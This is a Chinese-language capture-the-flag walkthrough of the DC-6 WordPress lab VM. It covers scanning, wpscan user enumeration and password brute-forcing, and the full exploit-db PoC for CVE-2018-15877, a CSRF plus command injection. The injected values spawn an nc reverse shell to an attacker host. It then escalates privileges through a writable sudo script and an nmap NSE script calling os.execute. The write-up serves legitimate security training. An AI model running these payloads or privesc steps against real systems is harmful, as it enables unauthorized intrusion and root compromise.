## DC-6靶场

### 主机扫描

```bash
nmap -sP 192.168.56.0/24
Nmap scan report for wordy (192.168.56.107)
Host is up (0.00016s latency).
MAC Address: 08:00:27:50:FB:08 (Oracle VirtualBox virtual NIC)
```

靶机ip：192.168.56.107

### 端口扫描

```
nmap -sV 192.168.56.107
```

开了22，80端口

访问web页面，发现跳转到wordy，那就做个域名解析

> ```
> vim /etc/hosts
> ```
>
> 192.168.56.107 wordy

### 目录扫描

```
dirb http://192.168.56.107/
```

扫到了wp-admin目录

### wpscan工具利用

网站是wordpress，那我们用wpscan扫描就行了

```
wpscan --url http://wordy
这样扫给的信息不够，需要用到api-token
[!] No WPScan API Token given, as a result vulnerability data has not been output.
```

登录[wpsan官网](https://wpscan.com/profile/)，获取一个token

```
wpscan --url http://wordy --api-token 4GXx8c2FQJQdnJxTY7raHIP1NkqqDZacGoT27nss7sA --enumerate u
```

枚举一下用户，得到五个用户

```
admin
graham
mark
sarah
jens
```

其实，我用的是cmseek扫描的，也是扫出来这五个用户

```
cmseek -u 192.168.56.107
```

![image-20240308144124363](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308144124363.png)

用户名有了，继续搞密码

一开始我是直接用kali里面的rockyou.txt爆破的，没爆破出来（密码太多了）

官网是有一个提示的

```
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)
```

那这个passwords.txt就是密码了

这里我直接用wpscan进行爆破了 -U 指定用户名 -P 指定密码

```
wpscan --url http://wordy -U users.txt -P passwords.txt
```

得到账号密码，`Username: mark, Password: helpdesk01`

### 登录web后台

登录上去，发现也没有写php的地方，那就找一下插件的漏洞

![image-20240308145539641](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308145539641.png)

```
cp /usr/share/exploitdb/exploits/php/webapps/45274.html ci.html
```

内容

```html
<!--
PoC:
-->

<html>
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

### 漏洞利用

这是一个csrf漏洞和命令注入，利用`|`符号

history.pushState( )这是一个非常神奇的javascript方法，让页面无刷新增添浏览器历史记录。

```
语法 history.pushState(state, title, url)
```

找到这个漏洞页面

![image-20240308150126876](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308150126876.png)

这个页面的功能有两个，上面按钮是将ipv4转换成长整形ip，下面的按钮是进行解析ip

利用`|`进行命令执行

![image-20240308150530986](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308150530986.png)

那我们接着弹shell吧，

```
127.0.0.1| nc -e /bin/bash 192.168.56.101 1234
```

切换到home目录，

进行mark的家

```shell
www-data@dc-6:/home/mark/stuff$ ls
ls
things-to-do.txt
www-data@dc-6:/home/mark/stuff$ cat t*
cat t*
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

发现，用户`graham - GSo7isUM1D4`

### 提权

先不急，看看别的目录

在jens的家目录，发现一个脚本

```
www-data@dc-6:/home/jens$ ls -al
ls -al
total 32
drwxr-xr-x 2 jens jens 4096 Mar  8 16:04 .
drwxr-xr-x 6 root root 4096 Apr 26  2019 ..
-rw------- 1 jens jens    5 Apr 26  2019 .bash_history
-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc
-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile
-rwxrwxr-x 1 jens devs   48 Mar  8 16:10 backups.sh
```

jens所有者和devs所属组有rwx权限

接着，切换到graham用户

```
graham@dc-6:~$ id                                
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

发现graham用户就是devs组的，并且可以不要密码执行`/home/jens/backups.sh`这个脚本

尝试提权到jens用户

```
echo '/bin/bash'>>backups.sh
```

以jens的身份进行执行

```
sudo -u jens /home/jens/backups.sh
```

这样就得到jens的shell

接着

```shell
jens@dc-6:~$ id
id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
jens@dc-6:~$ sudo -l
sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

jens用户可以使用nmap，nmap进行提权

```
echo 'os.execute("/bin/bash")' > a.nse
```

```
sudo nmap --script=a.nse
```

提权成功，

![image-20240308152242079](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308152242079.png)

## 总结

> nmap 提权。使用`--script`参数执行提权脚本
>
> 学会wpsacn的基本使用方法
>
> `os.execute ([command])`这是lua中的一个函数，相当于执行系统命令
>
> ```
> a & b   //先执行a再执行b，无论a是否执行成功(按位与)
> a && b  //先执行a再执行b，只有a执行成功才会执行b(逻辑与)
> a || b  //先执行a再执行b，只有a执行失败才会执行b(逻辑或)
> a | b   //将a的执行结果传递给b(管道符)
> ```
>
> 靶机涉及知识点：
>
> 暴力破解，csrf，命令执行

